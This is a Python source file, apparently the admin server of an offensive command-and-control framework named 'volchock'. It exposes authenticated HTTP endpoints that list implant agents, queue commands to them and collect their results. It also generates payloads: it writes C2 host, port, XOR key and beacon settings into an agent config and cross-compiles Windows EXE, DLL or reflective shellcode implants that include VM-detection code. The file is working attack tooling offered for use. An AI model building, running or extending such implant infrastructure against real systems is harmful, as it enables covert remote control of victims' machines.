# teamserver/admin/admin_server.py
# Runs the administrative HTTP server for the Teamserver, 
# exposing management APIs and admin functionalities.

from flask import Flask, request, jsonify
from functools import wraps
from queue import Queue
import base64
import sys, os, json, subprocess, shutil
from teamserver.listener.http_listener import HttpListener
from teamserver.logger.CustomLogger import CustomLogger
log = CustomLogger("volchock-admin")

class AdminServer:
    def __init__(self, port, users_dict, listeners, shared_req_queue, auth_required=True, agent_handler=None, xor_key=None):
        self.port = port
        self.users = users_dict
        self.auth_required = auth_required
        self.shared_req_queue = shared_req_queue
        self.agent_handler = agent_handler
        self.xor_key = xor_key
        self.connected_users = []
        self.listeners = listeners
        self.app = Flask(__name__)
        self.add_endpoints()

    def check_auth(self, username, password):
        if (username in self.users and self.users[username] == password):
            if username not in self.connected_users:
                log.info(f"[+] New user connected: {username}")
                self.connected_users.append(username)
            return True
        else:
            log.error(f"[!] Incorrect login for user: {username}")
            return False

    def require_auth(self, f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if not self.auth_required:
                return f(*args, **kwargs)
            auth = request.authorization
            if not auth or not self.check_auth(auth.username, auth.password):
                return (
                    jsonify({"error": "Unauthorized"}),
                    401,
                    {"WWW-Authenticate": 'Basic realm="Login required"'},
                )
            return f(*args, **kwargs)
        return decorated

    def add_endpoints(self):
        @self.app.route('/status', methods=['GET'])
        @self.require_auth
        def status():
            return jsonify({"status": "teamserver running"})

        @self.app.route('/logs', methods=['GET'])
        @self.app.route('/logs/<logger_name>', methods=['GET'])
        @self.require_auth
        def get_logs(logger_name=None):
            if logger_name is None:
                log_instance = CustomLogger("volchock")
            else:
                log_instance = CustomLogger(logger_name)
            logs = log_instance.get_logs()
            return jsonify({"logs": logs})

        @self.app.route('/pending_requests', methods=['GET'])
        @self.require_auth
        def pending_requests():
            reqs = []
            while not self.shared_req_queue.empty():
                reqs.append(self.shared_req_queue.get())
            return jsonify({"requests": reqs})

        @self.app.route('/agents', methods=['GET'])
        @self.require_auth
        def agents():
            if self.agent_handler is not None:
                agents = self.agent_handler.all_agents()
                result = []
                for aid, info in agents.items():
                    r = info.copy() if info else {}
                    r['agent_id'] = aid
                    result.append(r)
                return jsonify({"agents": result})
            else:
                return jsonify({"agents": []})

        @self.app.route('/agent/<agent_id>/info', methods=['GET'])
        @self.require_auth
        def agent_info(agent_id):
            if self.agent_handler is not None:
                info = self.agent_handler.get_agent(agent_id)
                if info:
                    return jsonify({"info": info})
                else:
                    return jsonify({"error": "Agent not found"}), 404
            else:
                return jsonify({"error": "No agent_handler"}), 500

        @self.app.route('/agent/<agent_id>/command', methods=['POST'])
        @self.require_auth
        def send_command(agent_id):
            if self.agent_handler is not None:
                data = request.get_json() or {}
                command = data.get("command")
                if not command:
                    return jsonify({"error": "No command provided"}), 400
                ok = self.agent_handler.queue_command(agent_id, command)
                if not ok:
                    return jsonify({"error": f"Agent {agent_id} not found"}), 404
                log.info(f"[+] New command submit by {request.authorization.username}: {command[0:25]}")
                return jsonify({"status": "command queued"})
            else:
                return jsonify({"error": "No agent_handler"}), 500

        @self.app.route('/agent/<agent_id>/results', methods=['GET'])
        @self.require_auth
        def get_results(agent_id):
            if self.agent_handler is not None:
                res = self.agent_handler.pop_agent_results(agent_id)
                return jsonify({"results": res})
            return jsonify({"results": []})


        @self.app.route('/listeners', methods=['GET'])
        @self.require_auth
        def get_listeners():
            res = []
            for listener in self.listeners:
                if isinstance(listener, HttpListener):
                    res.append(f"""
{listener.name} 
    Type : HttpListener
    Host : {listener.host}
    Port : {listener.port}

""")
            return jsonify({"listeners": res})



        def get_profile_props(profile_name):
            profiles = [
                os.path.join(os.path.dirname(__file__), "..", "profiles", "volchock.profile"),
            ]
            for profile_path in profiles:
                if not os.path.exists(profile_path):
                    log.error(f"[!] Listener profile not found: {profile_path}")
                    return False
                with open(profile_path, "r", encoding="utf-8") as fp:
                    profiles_cfg = json.load(fp)
                for profile_cfg in profiles_cfg:
                    name = profile_cfg.get("name")
                    if name is None:
                        log.error(f"[!] Name not specified in profile: {profile_path}")
                        return False
                    if name == profile_name:
                        host = profile_cfg.get("host")
                        port = profile_cfg.get("port")
                        xor_key = profile_cfg.get("xor_key")
                        user_agent = profile_cfg.get("user_agent")
                        uri_first_path = profile_cfg.get("uri_paths")[0]
                        http_headers = profile_cfg.get("http_headers", {})
                        header_lines = [f"{k}: {v}" for k, v in http_headers.items()]
                        header_cstr = "\\n".join(header_lines)

                        if host is None or port is None or xor_key is None or user_agent is None or uri_first_path is None or header_cstr is None:
                            log.error(f"[!] A property is missing in profile: {profile_name}")
                            return False
                        new_agent_config = f"""
#pragma once
#include <string>
constexpr char XOR_KEY[] = "{xor_key}";
constexpr char VOLCHOCK_SERVERS[] = "{host}";
constexpr int VOLCHOCK_PORT = {port};
constexpr char USER_AGENT[] = "{user_agent}";
constexpr char HEADER[] = "{header_cstr}";
constexpr char RESULTS_PATH[] = "{uri_first_path}";
constexpr int BEACON_INTERVAL = 5;
"""
                        log.info(f"[+] Updating agent config file")
                        with open('agent/http/config.h', 'w', encoding='utf-8') as config_file:
                            config_file.write(new_agent_config)
                        return True
            return False


        @self.app.route('/generate/<listener_name>/<payload_type>', methods=['GET'])
        @self.require_auth
        def generate(listener_name, payload_type):
            for listener in self.listeners:
                if listener.name == listener_name:
                    if get_profile_props("http"):
                        if shutil.which("x86_64-w64-mingw32-g++") is None:
                            log.error(f"[!] x86_64-w64-mingw32-g++ is not installed on the server")
                            return jsonify({"results": "[!] x86_64-w64-mingw32-g++ is not installed on the server"})
                        if payload_type == "exe":
                            log.info(f"[+] Building EXE agent with the updated config")
                            subprocess.run('cd agent/http && x86_64-w64-mingw32-g++ -o agent.exe main_exe.cpp vm_detection.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32', shell=True)
                            with open("agent/http/agent.exe", 'rb') as f:
                                exe_agent = f.read()
                            b64_exe_agent = base64.b64encode(exe_agent).decode("utf-8")
                            return jsonify({"results": {"content" : b64_exe_agent} })
                        elif payload_type == "dll":
                            log.info(f"[+] Building DLL agent with the updated config")
                            subprocess.run('cd agent/http && x86_64-w64-mingw32-g++ -shared -o agent.dll main_dll.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp vm_detection.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32', shell=True)
                            with open("agent/http/agent.dll", 'rb') as f:
                                dll_agent = f.read()
                            b64_dll_agent = base64.b64encode(dll_agent).decode("utf-8")
                            return jsonify({"results": {"content" : b64_dll_agent} })
                        elif payload_type == "shellcode":
                            log.info(f"[+] Building SHELLCODE agent with the updated config")
                            subprocess.run('cd agent/http && x86_64-w64-mingw32-g++ -shared -o agent.dll main_dll.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp vm_detection.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32', shell=True)
                            subprocess.run('cd agent/ReflectiveLoader && python3 shellcodize.py ../http/agent.dll', shell=True)
                            with open("agent/ReflectiveLoader/shellcode.bin", 'rb') as f:
                                shellcode_agent = f.read()
                            b64_shellcode_agent = base64.b64encode(shellcode_agent).decode("utf-8")
                            return jsonify({"results": {"content" : b64_shellcode_agent} })

                        else:
                            return jsonify({"results": "Incorrect payload type. Choose between \"exe\", \"dll\" or \"shellcode\"."})
                    return jsonify({"results": "An unexpected error occured in get_profile_props function."})
            return jsonify({"results": "No listener with that name"})


    def start(self):
        log.info(f"[+] Admin server started on port {self.port}")
        self.app.run(host="0.0.0.0", port=self.port, threaded=True)